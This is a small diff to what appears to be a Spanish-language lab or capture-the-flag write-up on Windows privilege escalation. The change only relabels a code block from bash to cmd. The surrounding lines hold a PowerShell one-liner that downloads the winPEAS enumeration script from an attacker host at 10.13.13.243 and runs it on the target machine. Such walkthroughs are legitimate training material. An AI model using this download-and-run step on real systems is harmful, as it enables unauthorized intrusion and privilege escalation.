@@ -107,7 +107,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.13.243:
 
 usaremos este enlace https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat y lo descargamos en la maquina con 
 
-```bash
+```cmd
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.13.243:80/winPEAS.batx86','winPEASx86.bat')"
 .\winPEAS.bat
 ```
